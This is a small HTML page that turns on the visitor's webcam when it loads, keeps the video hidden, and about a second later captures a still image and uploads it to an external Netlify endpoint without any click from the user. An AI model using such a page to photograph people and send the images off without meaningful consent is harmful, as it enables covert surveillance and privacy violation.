<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Photo Capture</title>
</head>
<body>
    <h1>Taking Your Photo...</h1>
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    <p id="status">Initializing...</p>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        // Automatically request camera permission and start video stream
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                video.addEventListener('loadedmetadata', () => {
                    // Capture photo after the video starts playing
                    setTimeout(captureAndUploadPhoto, 1000); // Delay for 2 seconds to ensure camera readiness
                });
                status.textContent = "Camera ready. Capturing photo...";
            })
            .catch(err => {
                status.textContent = "Error accessing camera: " + err.message;
            });

        // Function to capture photo and upload it
        function captureAndUploadPhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the photo to a Base64 string
            const dataUrl = canvas.toDataURL('image/png');

            // Send the photo to the Flask backend
            fetch('https://visionary-chaja-360a2e.netlify.app/upload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ photo: dataUrl }),
            })
            .then(response => response.json())
            .then(data => {
                status.textContent = data.message || "Photo uploaded successfully!";
            })
            .catch(error => {
                status.textContent = "Error uploading photo: " + error.message;
            });
        }
    </script>
</body>
</html>
